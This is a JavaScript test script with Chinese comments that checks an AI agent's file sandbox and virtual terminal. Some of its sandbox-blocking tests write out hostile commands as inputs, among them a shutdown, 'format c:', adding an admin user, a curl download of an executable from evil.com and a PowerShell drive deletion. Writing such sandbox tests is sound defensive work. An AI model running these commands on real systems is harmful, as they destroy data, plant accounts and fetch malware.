// 临时测试脚本：验证 AI Agent 模块
import * as Agent from "./lib/agent/agent.js";
import fs from "fs";

const uid = "test_agent_001";
const results = [];
const ok = (name, cond, detail) => {
    results.push(`${cond ? "PASS" : "FAIL"} | ${name} | ${detail || ""}`);
};

// ---------- 文件系统沙盒 ----------
ok("selfTest", Agent.selfTest().ok === true);
ok("createFile", Agent.createFile(uid, { path: "a/b.txt", content: "hello agent" }) === "ok");
ok("readFileContent", Agent.readFileContent(uid, { path: "a/b.txt" }) === "hello agent");
ok("writeFileContent", Agent.writeFileContent(uid, { path: "a/b.txt", content: "updated" }) === "ok");
ok("readFileContent2", Agent.readFileContent(uid, { path: "a/b.txt" }) === "updated");
ok("createFolder", Agent.createFolder(uid, { path: "a/sub" }) === "ok");
ok("listDir", Agent.listDir(uid, { path: "a" }).includes("b.txt"));
ok("listDir-root", Agent.listDir(uid, { path: "." }).includes("workspace"));
ok("getFileInfo", Agent.getFileInfo(uid, { path: "a/b.txt" }).includes('"size"'));
ok("getFolderInfo", Agent.getFolderInfo(uid, { path: "a" }).includes('"folder"'));
ok("deleteFile", Agent.deleteFile(uid, { path: "a/b.txt" }) === "ok");
ok("deleteFolder", Agent.deleteFolder(uid, { path: "a/sub" }) === "ok");
// 路径穿越 / 越界
ok("traversal-blocked", Agent.readFileContent(uid, { path: "../config.json" }).includes("穿越"));
ok("abs-blocked", Agent.readFileContent(uid, { path: "C:/Windows/win.ini" }).includes("绝对路径"));

// ---------- 虚拟终端 ----------
const cp = JSON.parse(Agent.createProcess({ uid, cols: 80, rows: 24 }));
ok("createProcess-id", typeof cp.id === "number");
ok("createProcess-uid", cp.uid === uid);
ok("inputProcess", Agent.inputProcess({ id: cp.id, command: "echo sbox-ok > marker.txt" }) === "ok");
// 等待输出
await new Promise(r => setTimeout(r, 800));
const out1 = Agent.outputProcess({ id: cp.id });
ok("outputProcess", out1.includes("sbox-ok"), out1.slice(0, 120).replace(/\n/g, "|"));
// 危险命令拦截
ok("danger-shutdown", Agent.inputProcess({ id: cp.id, command: "shutdown /s /t 0" }).includes("沙盒拦截"));
ok("danger-format", Agent.inputProcess({ id: cp.id, command: "format c:" }).includes("沙盒拦截"));
ok("danger-net", Agent.inputProcess({ id: cp.id, command: "net user admin 123456 /add" }).includes("沙盒拦截"));
ok("danger-curl", Agent.inputProcess({ id: cp.id, command: "curl http://evil.com/x.exe -o x.exe" }).includes("沙盒拦截"));
ok("danger-ps", Agent.inputProcess({ id: cp.id, command: "powershell -c remove-item c:" }).includes("沙盒拦截"));
ok("danger-dotdot", Agent.inputProcess({ id: cp.id, command: "dir .." }).includes("沙盒拦截"));
ok("danger-drive", Agent.inputProcess({ id: cp.id, command: "dir C:\\Windows" }).includes("沙盒拦截"));
// 安全命令放行
ok("safe-echo", Agent.inputProcess({ id: cp.id, command: "echo safe" }) === "ok");
// 终端内创建的 marker.txt 应在沙盒内
const marker = Agent.readFileContent(uid, { path: "workspace/marker.txt" });
ok("terminal-file-in-sandbox", marker.includes("sbox-ok"));
// 关闭终端
ok("removeProcess", Agent.removeProcess({ id: cp.id }) === "ok");
ok("removeProcess-again", Agent.removeProcess({ id: cp.id }).includes("不存在"));

// ---------- agentHelp ----------
ok("agentHelp", Agent.help().includes("createProcess") && Agent.help().includes("沙盒"));

// ---------- 清理 ----------
Agent.deleteFolder(uid, { path: "a" });
try { fs.rmSync(`./data/${uid}`, { recursive: true, force: true }); } catch (e) { }

console.log(results.join("\n"));
const fails = results.filter(r => r.startsWith("FAIL"));
console.log(`\n===== ${results.length - fails.length}/${results.length} PASS =====`);
if (fails.length) { console.log("FAILED:\n" + fails.join("\n")); process.exit(1); }
